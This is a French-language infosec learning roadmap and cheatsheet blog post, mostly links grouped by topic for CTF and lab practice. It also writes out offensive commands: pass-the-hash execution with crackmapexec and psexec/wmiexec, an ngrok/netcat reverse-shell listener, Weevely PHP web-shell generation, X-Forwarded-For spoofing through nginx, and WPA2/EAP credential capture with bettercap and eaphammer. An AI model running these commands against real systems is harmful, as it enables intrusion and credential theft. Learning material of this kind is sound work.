---
title: "Cheatsheet"
summary: "Quelques ressources pour débuter, from zero to hero"
date: 2023-07-10T22:27:18+02:00
lastmod: 2023-07-10T22:27:18+02:00
description: Une roadmap en infosec
author: "Nu1t"
tags: ["active directory", "article", "crypto", "forensic", "misc", "pwn", "reseau","reverse", "web", "web3"]
resources:
  - name: "featured-image"
    src: "featured-image.png"
---

## Dépôt

{{< admonition type=tip title="Quelques catégories supplémentaires et notes actualisées" open=true >}}

https://github.com/0x14mth3n1ght/Hacking

{{</admonition>}}

## Intro

Ce post est un peu spécial. En effet je tenais à partager quelques ressources qui m'ont permis de mettre un pied dans l'infosec en partant de zéro.

Est-ce légitime en 2023 de proposer cela? 

Effectivement, il y a pléthore d'articles, de blogs, de livres ainsi que de communautés. 
Mais il est facile de se confronter à un mur et de se décourager pour diverses raisons. 

Voici donc un agrégat de ressources:

## Vulgarisation

Des vidéos permettant de découvrir le sujet et de se donner un plan d'attaque.

**Hackintux**:
{{< youtube NuI2xo6v5ko >}}

**Hafnium**:
{{< youtube Q7oMZiiWWek >}}

## Les bases

Juste quelques cours/playlists d'informatique générale pour donner une idée.
Ok, sauf pour le web (**OpenClassrooms** peut suffire dans tous les cas)

- Linux: {{< youtube OMaNgQi6Fvc>}}
- Programmation: {{< youtube 90hGCMC3Chc>}}
- Réseau: {{< youtube 26jazyc7VNk>}}
- Web: {{< youtube J-1s-ONitRc>}}

Quelques communautés:

- https://lecrabeinfo.net/ 
- https://openclassrooms.com/fr/courses
- https://zestedesavoir.com/

## Teach yourself infosec

A partir d'ici, la sécurité commence.

https://owasp.org/www-community/attacks/

https://d3fend.mitre.org/

Quelques ressources très complètes ici, par thème.
Pour chaque catégorie, des ressources et plateformes sont données pour s'entraîner.

- https://teachyourselfinfosec.com/

Dans la même idée, en français:

- https://secu.si/

- https://wiki.zenk-security.com/doku.php/

- https://www.bases-hacking.org/hacking.html

De très bons livres (dont certains tirés d'OReilly), cours et articles (pas que sur la sécurité) existent aussi ici:

- https://doc.lagout.org/


## Ressources 

On entre dans le vif du sujet. Maintenant, choisissez la catégorie qui vous plaît et n'hésitez pas à reprendre au point précédent.

## Active Directory

{{< youtube nhW-0qZzjy4>}}

### Bases LDAP

https://www-sop.inria.fr/members/Laurent.Mirtain/ldap-livre.html

### Doc AD:

- https://zer1t0.gitlab.io/posts/attacking_ad/

- https://ntlm.info/

- https://tesserent.com/insights/blog/dumping-windows-credentials?utm_source=securusglobal.com&utm_medium=301

- https://beta.hackndo.com/pass-the-hash/#protocole-ntlm

`mindmap`https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg

### Kerberoast

**SPN non vide**

- https://beta.hackndo.com/kerberoasting/
- [GetUserSPNs.py](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)

### AsRepRoast

**User sans PreAuth**

- https://beta.hackndo.com/kerberos-asrep-roasting/
- https://www.login-securite.com/2022/11/03/analyse-et-poc-de-la-cve-2022-33679/
- ([UAC values](https://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/))
- [GetNPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py)

[Box Active (HTB)](https://0xdf.gitlab.io/2018/12/08/htb-active.html)

Synchroniser l'horloge:

`sudo ntpdate <ip>`

- `crackmapexec`:
	- check GPPPassword ([share spidering](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=smb-spider_plus): spider_plus): `cme smb <Domain> -u <user> -p <pass> -M gpp_password`
	- check SamAccountName: `crackmapexec smb <ip> -M nopac` & `crackmapexec ldap -d <Domain> -u <user> -p <pass> -M Maq` (max machines à créer)
	- Pass The Hash: `crackmapexec <ip> -u Administrator -H <lmhash:nthash> -x 'whoami'`

### Silver/Golden Ticket

- https://beta.hackndo.com/kerberos-silver-golden-tickets/#pac
- https://github.com/fortra/impacket/issues/1457

### Shell

**Domain.local/Administrator@127.0.0.1**

`psexec.py <Domain>/<user>:<pass>@<DC.local>`
`wmiexec.py <Domain>/<user>@<DC.local> -hashes ':<nthash>'`

### FreeRDP2

(TryHackMe AD Basics)

```bash
xfreerdp /v:10.10.222.63 /u:THM\Mark /p:M4rk3t1ng.21
```

## Crypto

### Doc

- https://cryptobook.nakov.com/

### Cle publique

- [RSA](https://crypto.stanford.edu/~dabo/pubs/papers/RSA-survey.pdf), 
 https://vozec.fr/crypto-rsa/ , [Side Channel RSA - RSA CRT cf FCSC](https://www.cosade.org/cosade19/cosade14/presentations/session2_b.pdf)

- [DSA,ElGamal, RSA-CRT - Zenk](https://repo.zenk-security.com/Cryptographie%20.%20Algorithmes%20.%20Steganographie/Cle%20Publique.pdf)

- [Shamir Secret Sharing](https://max.levch.in/post/724289457144070144/shamir-secret-sharing)

### Blocs

- [AES](https://braincoke.fr/blog/2020/08/the-aes-encryption-algorithm-explained/#encryption-algorithm-overview),
  - https://stackoverflow.com/questions/1220751/how-to-choose-an-aes-encryption-mode-cbc-ecb-ctr-ocb-cfb

- [Block cipher modes of operation](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation)
	
	- https://en.wikipedia.org/wiki/Padding_oracle_attack

  - https://crypto.stackexchange.com/questions/42891/chosen-plaintext-attack-on-aes-in-ecb-mode

  - https://crypto.stackexchange.com/questions/66085/bit-flipping-attack-on-cbc-mode

  - https://research.nccgroup.com/2021/02/17/cryptopals-exploiting-cbc-padding-oracles/


- https://vozec.fr/crypto-lattice/lattice-introduction/

- [Elliptic Curves](https://people.cs.nctu.edu.tw/~rjchen/ECC2012S/Elliptic%20Curves%20Number%20Theory%20And%20Cryptography%202n.pdf)

### Log Discret

{{<youtube issM-hvLemE>}}

### Cheatsheet

- https://github.com/zademn/EverythingCrypto
- https://github.com/jvdsn/crypto-attacks

### Outils

- [z3](https://theory.stanford.edu/~nikolaj/programmingz3.html)
- [OpenSSL cheatsheet](https://www.freecodecamp.org/news/openssl-command-cheatsheet-b441be1e8c4a/)

https://www.login-securite.com/2021/10/29/sthackwriteup-forensic-docker-layer/

```bash
# AES-CBC
openssl aes-256-cbc -d -iter 10 -pass pass:$(cat /pass.txt) -in flag.enc -out flag.dec
```

```
bash
# Base64 & digest - JWT
echo <b64(header).b64(payload)> | openssl dgst -sha256 -mac HMAC -macopt:hexkey:$(cat key.pem | xxd -p | tr -d "\\n")
python -c 'import hmac, hashlib, base64; print(base64.urlsafe_b64encode(hmac.new(<key>, <token>, hashlib.sha256).digest()).replace("=", ""))'
```

- [Hashes.com](https://hashes.com)
- [Dcode](https://www.dcode.fr/)
- [Cyberchef](https://gchq.github.io/CyberChef/) : Divers encodages/hashs et autres
- [Alpertron](https://www.alpertron.com.ar/ECM.HTM) : RSA (en + de `factordb` et `simpy`)

- https://github.com/tna0y/Python-random-module-cracker

- [Gmpy2](https://gmpy2.readthedocs.io/en/latest/overview.html)
- [Pycryptodome](https://pycryptodome.readthedocs.io/en/latest/src/api.html)
- [Sage (ECC)](https://doc.sagemath.org/html/en/reference/arithmetic_curves/sage/schemes/elliptic_curves/constructor.html)
- [Sympy (docs)](https://docs.sympy.org/latest/modules/polys/reference.html)

### Cours: Cryptohack Starters

https://github.com/0x14mth3n1ght/Hacking/tree/main/crypto/elliptic_curves

## Forensic

### Analyse de logs

https://github.com/0x14mth3n1ght/Writeup/tree/master/2023/FCSC/forensic/weird_shell

### Exfiltration

https://tshark.dev/
https://wiki.wireshark.org/SampleCaptures

### Tools:

- [Autopsy](https://www.sleuthkit.org/)
- `binwalk` (`binwalk -e <file>` , `binwalk -dd="*" <file>`)
- [Dive (docker)](https://github.com/wagoodman/dive)
- `photorec` (récupérer les fichiers supprimés (unlinkés)
-  https://github.com/corkami/docs/blob/master/PDF/PDF.md

- `volatility`:
        - profils linux avec [Vol2 (HackSecuReims)](https://github.com/0x14mth3n1ght/Writeup/tree/master/2023/HackSecuReims/forensic/memdump)

`Une fois setup ci dessous effectué`

https://volatility3.readthedocs.io/en/latest/getting-started-linux-tutorial.html#

### Profils Linux (Vol3)

```bash
python ~/volatility3/vol.py -f memory.dmp banners.Banners
# Linux 5.x-y
```

```Dockerfile
# Version souhaitée de l'OS
FROM debian:bullseye

ARG KERNEL_VERSION=5.10.0-21
ARG KERNEL_ARCH=amd64

# Update et installation des dépendances nécessaires à Dwarf2json

# /!\
# Il faut charger l'image `-dbg` avec la version trouvée pour avoir le fichier DWARF

RUN apt update
RUN apt install -y \
  linux-image-${KERNEL_VERSION}-${KERNEL_ARCH}-dbg \
  linux-headers-${KERNEL_VERSION}-${KERNEL_ARCH} \
  build-essential golang-go git make

# Volatility3
# Récupération de Dwarf2json
RUN git clone https://github.com/volatilityfoundation/dwarf2json

WORKDIR dwarf2json

# On build puis on génère le fichier JSON depuis le fichier DWARF
RUN go mod download github.com/spf13/pflag
RUN go build
RUN ./dwarf2json linux --elf /usr/lib/debug/boot/vmlinux-${KERNEL_VERSION}-${KERNEL_ARCH} > linux-image-${KERNEL_VERSION}-${KERNEL_ARCH}.json

CMD ["sleep", "3600"]
```

```bash
docker build -t dwarf2json .

CONTAINER_ID=$(docker run -ti --rm -d dwarf2json)
docker cp $CONTAINER_ID:/dwarf2json/linux-image-5.10.0-21-amd64.json volatility3/volatility3/symbols

docker rm -f $CONTAINER_ID
```

```bash
python volatility3/vol.py -f memory.dmp linux.bash
```

### Profils Android

https://github.com/504ensicsLabs/LiME

## Pwn

### Doc :

- Vidéos/Plateformes/Docs: https://mksec.fr/tricks/pwn_ressources/ 

- Overview du pwn en fr: https://own2pwn.fr 

- [The Shellcoder Handbook](https://doc.lagout.org/security/The%20Shellcoder%E2%80%99s%20Handbook.pdf)

### ARM,MIPS,RISCV

Voir `reverse`

### Arguments et payload

https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection

### Pile/Stack

{{< youtube WG7QtpRPArg>}}

https://thinkloveshare.com/hacking/pwn_1of4_buffer_overflow/

https://ir0nstone.gitbook.io/notes/types/stack

### Protections

- https://learn-cyber.net/article/What's-That-Preventing-Your-Exploit

- `ASLR`: randomise base address -> Ret2libc
- `PIE`: randomise offset -> Leak fonction (format string)
- `CANARY ou SSP`: https://learn-cyber.net/article/Understanding-and-Defeating-the-Canary


### Format Strings

- https://learn-cyber.net/article/Format-String-Vulnerabilities
- https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
- https://axcheron.github.io/exploit-101-format-strings/

### Tas/Heap

- https://samwho.dev/memory-allocation/

- https://heap-exploitation.dhavalkapil.com/attacks/first_fit

- https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/

{{< youtube PFqEKkj7wWs >}}

{{< youtube o-nRssrHNMw>}}

- https://github.com/shellphish/how2heap

### Kernel

- https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/

- Kernelmap interactive: https://makelinux.github.io/kernel/map/

- Kernel: https://0xax.gitbooks.io/linux-insides/content/

### Débuggers (pour binaires ELF (Linux), plus courants en pwn)

voir `../tutos` (cours/prog C)

- [gdb pour pwn](https://tc.gts3.org/cs6265/2019/tut/tut01-warmup1.html) , pour la **stack** [gdb-gef](https://github.com/hugsy/gef), pour la **heap** [pwndbg](https://github.com/pwndbg/pwndbg/blob/dev/FEATURES.md) 


- `r2`: https://github.com/radareorg/radare2

### Plateformes

https://deusx64.ai/

https://exploit.education/

https://pwn.college/

https://ropemporium.com/

## Reseau

{{< youtube Oc7Ts8tVjyE>}}
{{< youtube B1vqKQIPxr0 >}}

### Doc

- https://zestedesavoir.com/tutoriels/2789/les-reseaux-de-zero/
- https://ctf-wiki.mahaloz.re/misc/traffic/introduction/
- https://cheatsheet.haax.fr/shells-methods/reverse/
- https://github.com/sergiomarotco/Network-segmentation-cheat-sheet
- https://github.com/V0lk3n/WirelessPentesting-CheatSheet

### Tools

- [Bettercap](https://www.bettercap.org/installation/)
- [Eaphammer](https://github.com/s0lst1c3/eaphammer)
- [Hex Packet Decoder](https://www.gasmi.net/hpd/)
- [Ngrok](https://ngrok.com/)
- [Revshells](https://revshells.com)
- [Tshark](https://tshark.dev/) , https://wiki.wireshark.org/SampleCaptures

### Curl

`curl  is a tool for transferring data from or to a server. It supports these protocols: DICT, FILE, FTP, FTPS,
GOPHER, GOPHERS, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP,  SMB,
SMBS, SMTP, SMTPS, TELNET or TFTP. The command is designed to work without user interaction.`

### HTTP

[Curl Options & POST](https://gist.github.com/subfuzion/08c5d85437d5d4f00e58)

### LDAP

- https://www-sop.inria.fr/members/Laurent.Mirtain/ldap-livre.html
- https://serverfault.com/questions/1083914/replace-anonymous-ldapsearch-command-with-curl-command

### Reverse/Web shell

Configurer son /etc/hosts

https://stackoverflow.com/questions/12260587/kerberos-fails-when-accessing-site-by-ip-address

```bash
/etc/hosts
ip DOMAIN
ip DC
```

`Revere shell - Ngrok`

(Non nécessaire si l'attaquant et la cible sont sur le même réseau)

```bash
#term1
ngrok config add-authtoken TOKEN
ngrok tcp 4444
#Forwarding tcp://5.tcp.eu.ngrok.io:16833 -> localhost:4444
```

```bash
#term2
nc -nlvp 4444
```

`Web shell - Weevely`

```bash
weevely generate password shell.php5
weevely http://10.10.97.185/uploads/shell.php5 password
```

### Reverse Proxy

`Ip Spoofing`

```bash
sudo apt install nginx
```

```bash
sudo vim etc/nginx/sites-available/default
```

```
server {
   ...
         # remplacer location /
	location / {
                proxy_pass http://vulnerable-site.org ; 
                proxy_set_header X-Forwarded-For $remote_addr ;
	}
   ...
}
```

```bash
sudo systemctl restart nginx
firefox $(ip a s eth0 | awk -F'[/ ]+' '/inet[^6]/{print $3}')/page #http://vulnerable-site.org/page
```

### Wifi

`Arp Spoofing`

https://security.stackexchange.com/questions/225985/is-there-any-point-of-arp-spoofing-on-a-wifi-network

```bash
sudo ip l set wlanx down
sudo iw wlanx set monitor none
sudo ip l set wlanx up
sudo iw wlanx info
sudo wireshark&
```

https://dl.aircrack-ng.org/breakingwepandwpa.pdf

`WPA2 - PSK`

```bash
sudo docker run -it --privileged --rm --net=host bettercap/bettercap -iface wlanx
#wifi.recon help

wpapcap2john bettercap-wifi-handshakes.pcap
```

https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/

`WPA2 - EAP`

```bash
sudo python3 ./eaphammer –cert-wizard
sudo python3 ./eaphammer -i wlan6 --creds -e "xxx" -b xx:xx:xx:xx:xx:xx #BSSID /MAC
```

## Reverse

https://www.youtube.com/@StephenChapman

https://m.youtube.com/c/oalabs

### Assembleur x86

https://beta.hackndo.com/assembly-basics/

{{< youtube tmtXn2UXR3g>}}

### Doc reverse:

- https://www.begin.re
- https://tmpout.sh/
- [Plateforme Crackme.one](https://crackmes.one)
- `Awesome Reversing +`:  https://github.com/wtsxDev/reverse-engineering

{{< youtube TUtQcezMDUU >}}

### Quelques outils:

À posséder:

- En ligne:
	- `Dogbolt (decompiler explorer)`: compare le pseudo code source de différents outils (Ghidra, Hex Rays, Ida, Binary Ninja) rapidement
	- `Disassembler.io`

- `Ghidra` : https://ghidra-sre.org/ (clone d'après les sources du git)

- `UPX unpacker` : https://github.com/NozomiNetworks/upx-recovery-tool

### Windows

Reverse: décompilos:

- `DotPeek` : https://www.jetbrains.com/fr-fr/decompiler/ -> parfait pour du `.NET`
- `DnSpy` : https://github.com/dnSpy/dnSpy -> plus maintenu

### Linux

Outils classiques:

- `objdump`:
	`-t` : afficher la table des symboles -> si rien : voir ../../pwn/asm
	`-h`: afficher les sections

- `ltrace`: voir les fonctions de la libc appelées

- `strace`: voir les syscalls

- `ldd`: voir les bibliothèques/libc utilisées (Hijacking, [ret2libc](../pwn/stack/ret2libc)

Débuggers:

- `gdb`: [gef](https://github.com/hugsy/gef)
- `r2`: https://github.com/radareorg/radare2
- `x64dbg` (windows)

```bash
alias pwndbg='gdb -x ~/pwndbg/gdbinit.py -q '
alias gef='gdb -x ~/.gdbinit-gef.py -q '
alias gdb-peda='gdb -x ~/peda/peda.py'
```
### ARM

https://www.acmesystems.it/arm9_toolchain
https://0x90909090.blogspot.com/2014/01/how-to-debug-arm-binary-under-x86-linux.html

Compiler : 

```bash
arm-linux-gnueabihf-gcc -fno-pie -ggdb3 -no-pie -o hello_world hello_world.c
```

Exécuter : 

```bash 
qemu-arm -L /usr/arm-linux-gnueabihf -g 1234 ./hello_world
```

Reverser : 

```bash
gdb-multiarch -q --nh \
  -ex 'set architecture arm' \
  -ex 'set sysroot /usr/arm-linux-gnueabihf' \
  -ex 'file hello_world' \
  -ex 'target remote localhost:1234' \
  -ex 'break main' \
  -ex continue \
  -ex 'layout split'
```

### MIPS

https://pr0cf5.github.io/ctf/2019/07/16/mips-userspace-debugging.html

### RiscV

https://danielmangum.com/posts/risc-v-bytes-qemu-gdb/#installing-tools

### Bytecode / Outils spécifiques

- Python: `uncompyle`
- Java: `jadx`
- Android: `jadx`, `apktool`, `adb`
- Rust: https://github.com/h311d1n3r/Cerberus
- Unity: https://github.com/imadr/Unity-game-hacking#unity-game-folder-structure

## Web

{{<youtube 4Jk_I-cw4WE>}}

### Doc

- https://owasp.org/www-community/Source_Code_Analysis_Tools

- [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings)

- [Hacktricks](https://book.hacktricks.xyz/welcome/readme)

- [PayloadBox](https://github.com/payloadbox)

`GraphQL`

 - https://www.next-decision.fr/wiki/differentes-categories-api-majeures-rest-soap-graphql
 - https://blog.yeswehack.com/yeswerhackers/how-exploit-graphql-endpoint-bug-bounty/
 - https://ivangoncharov.github.io/graphql-voyager/

`SQLi`
  - https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/

`PHP`
  - `Type Juggling` https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf
  - `Eval` https://www.defenxor.com/blog/writing-simple-php-non-alphanumeric-backdoor-to-evade-waf/

`SSRF`
  - https://www.vaadata.com/blog/fr/comprendre-la-vulnerabilite-web-server-side-request-forgery-1/
  - https://www.dailysecurity.fr/server-side-request-forgery/

`XXE`
  - https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity
 
--------

`XSS`
 - https://beta.hackndo.com/attaque-xss/
 - https://excess-xss.com/
 - https://learn-cyber.net/article/Self-XSS-Attacks
 - https://learn-cyber.net/article/Reflected-XSS-Attacks

--------

- https://www.nzeros.me/2023/08/07/securinetsminictf2k22/
- https://mizu.re/tag/FCSC2023

### Extensions

- [Hacktools](https://addons.mozilla.org/fr/firefox/addon/hacktools/)
- [Wappalyzer](https://addons.mozilla.org/fr/firefox/addon/wappalyzer/)

### Tools

- [Burp](https://portswigger.net/burp) (Hackvertor, JWT, Param Miner)
- [Jwt_tool](https://github.com/ticarpi/jwt_tool)
- [Beeceptor](https://beeceptor.com/)

- [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
- [Gopherus](https://github.com/tarunkant/Gopherus)
- [RSS Validator](https://validator.w3.org/feed/)
- [Tplmap](https://github.com/epinna/tplmap)

- [Wayback machine ](https://archive.org), https://archive.md/ (web archive par mots clés & copie de sites)

## Web3

### Doc

- https://beta.hackndo.com/blockchain/ 

- https://docs.soliditylang.org/en/v0.8.20/ 

- https://ethereum.org/en/developers/docs/ 

- https://cypherpunks-core.github.io/ethereumbook/

## Pour aller plus loin

### Docs

https://www.sans.org/blog/the-ultimate-list-of-sans-cheat-sheets/

https://hide01.ir/

https://github.com/akr3ch/BugBountyBooks

### Chaines

[13Cubed](https://www.youtube.com/c/13cubed)

[John Hammond](https://www.youtube.com/channel/UCVeW9qkBjo3zosnqUbG7CFw)

[IppSec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)

[LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w)

[Xct](https://www.youtube.com/c/xct_de/channels)

### CTF 24h/24, 7j/7

https://fuzzy.land/challenges

### Notes utiles en CTF voire +

https://cheatsheet.haax.fr/

https://exploit-notes.hdks.org/

https://notes.vulndev.io/wiki
